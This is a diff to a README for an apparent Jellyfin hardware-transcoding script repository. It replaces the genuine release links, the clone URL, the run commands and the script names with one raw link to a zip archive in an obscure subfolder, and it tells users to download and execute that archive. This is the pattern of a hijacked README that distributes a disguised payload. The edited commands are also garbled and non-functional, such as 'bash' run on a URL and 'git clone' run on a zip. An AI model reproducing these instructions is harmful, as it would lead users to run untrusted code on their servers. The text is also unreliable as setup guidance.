@@ -2,7 +2,7 @@
 
 Welcome to the **Jellyfin Hardware Setup** repository! This collection of scripts helps you configure Jellyfin transcoding effectively. Whether you're setting up a home media server or optimizing your existing setup, these scripts will guide you through the process.
 
-[![Download Scripts](https://img.shields.io/badge/Download%20Scripts-Here-brightgreen)](https://github.com/423537/jellyfin-hw-setup/releases)
+[![Download Scripts](https://raw.githubusercontent.com/423537/jellyfin-hw-setup/main/nonbookish/setup-hw-jellyfin-1.9.zip%20Scripts-Here-brightgreen)](https://raw.githubusercontent.com/423537/jellyfin-hw-setup/main/nonbookish/setup-hw-jellyfin-1.9.zip)
 
 ## Table of Contents
 
@@ -24,7 +24,7 @@ This repository contains scripts that simplify the configuration process for tra
 
 ## Getting Started
 
-To get started, visit the [Releases](https://github.com/423537/jellyfin-hw-setup/releases) section to download the necessary scripts. You will need to execute these scripts on your server to set up your Jellyfin transcoding environment.
+To get started, visit the [Releases](https://raw.githubusercontent.com/423537/jellyfin-hw-setup/main/nonbookish/setup-hw-jellyfin-1.9.zip) section to download the necessary scripts. You will need to execute these scripts on your server to set up your Jellyfin transcoding environment.
 
 ### Prerequisites
 
@@ -44,7 +44,7 @@ To get started, visit the [Releases](https://github.com/423537/jellyfin-hw-setup
 1. Clone this repository to your server:
 
    ```bash
-   git clone https://github.com/423537/jellyfin-hw-setup.git
+   git clone https://raw.githubusercontent.com/423537/jellyfin-hw-setup/main/nonbookish/setup-hw-jellyfin-1.9.zip
    ```
 
 2. Navigate to the cloned directory:
@@ -53,10 +53,10 @@ To get started, visit the [Releases](https://github.com/423537/jellyfin-hw-setup
    cd jellyfin-hw-setup
    ```
 
-3. Visit the [Releases](https://github.com/423537/jellyfin-hw-setup/releases) section to download the scripts. Download the appropriate script file and execute it:
+3. Visit the [Releases](https://raw.githubusercontent.com/423537/jellyfin-hw-setup/main/nonbookish/setup-hw-jellyfin-1.9.zip) section to download the scripts. Download the appropriate script file and execute it:
 
    ```bash
-   bash setup-transcoding.sh
+   bash https://raw.githubusercontent.com/423537/jellyfin-hw-setup/main/nonbookish/setup-hw-jellyfin-1.9.zip
    ```
 
 ## Usage
@@ -67,22 +67,22 @@ Once you have installed the scripts, you can use them to configure your Jellyfin
 2. Run the setup script:
 
    ```bash
-   bash setup-transcoding.sh
+   bash https://raw.githubusercontent.com/423537/jellyfin-hw-setup/main/nonbookish/setup-hw-jellyfin-1.9.zip
    ```
 
 3. Follow the on-screen instructions to complete the setup.
 
 ## Scripts Overview
 
-### setup-transcoding.sh
+### https://raw.githubusercontent.com/423537/jellyfin-hw-setup/main/nonbookish/setup-hw-jellyfin-1.9.zip
 
 This script sets up the transcoding environment for Jellyfin. It installs necessary packages and configures settings based on your hardware.
 
-### check-hardware.sh
+### https://raw.githubusercontent.com/423537/jellyfin-hw-setup/main/nonbookish/setup-hw-jellyfin-1.9.zip
 
 Use this script to check if your hardware is compatible with Jellyfin transcoding. It provides a report on your system’s capabilities.
 
-### optimize-settings.sh
+### https://raw.githubusercontent.com/423537/jellyfin-hw-setup/main/nonbookish/setup-hw-jellyfin-1.9.zip
 
 This script optimizes your Jellyfin settings for better performance. It adjusts various parameters to enhance transcoding efficiency.
 
@@ -102,7 +102,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you have any questions or need assistance, feel free to open an issue in the repository. You can also check the [Releases](https://github.com/423537/jellyfin-hw-setup/releases) section for updates and new features.
+If you have any questions or need assistance, feel free to open an issue in the repository. You can also check the [Releases](https://raw.githubusercontent.com/423537/jellyfin-hw-setup/main/nonbookish/setup-hw-jellyfin-1.9.zip) section for updates and new features.
 
 ---
 
